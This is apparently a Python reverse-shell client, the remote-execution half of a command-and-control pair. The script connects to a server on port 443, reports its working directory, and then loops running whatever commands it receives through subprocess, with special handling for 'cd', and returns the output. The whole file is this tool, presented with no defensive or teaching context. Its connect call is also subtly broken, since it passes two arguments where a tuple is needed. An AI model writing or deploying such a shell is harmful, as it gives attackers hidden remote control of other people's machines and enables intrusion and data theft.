import socket
import os
import subprocess
import sys


# get / set server host and port
server_host = socket.gethostname()
server_port = 443

# set buffer size for comms
buffer_size = 1024 * 128

# set separator for multiple commands
separator = '<sep>'

# create socket object
s = socket.socket()

# connect
s.connect(server_host, server_port)

# send your pwd to the client
pwd = os.getcwd()
s.send(pwd.encode())

while True:
    # receive commands from the server
    command = s.recv(buffer_size).decode()
    split_command = command.split()

    if command.lower() == "exit":
        # exit breaks the loop
        break

    if split_command[0].lower() == "cd":
        # allows change directory
        try:
            # changes directory into the requested directory
            os.chdir(' '.join(split_command[1:]))
        except FileNotFoundError as e:
            # print the error
            output = str(e)
        else:
            # prints nothing if successful
            output = ""
    else:
        # if not changing directory send the command through
        output = subprocess.getoutput(command)

    # after the command reset with the pwd
    pwd = os.getcwd()

    # print output to the command
    message = f"{output}{separator}{pwd}"
    s.send(message.encode())

# close connection
s.close()


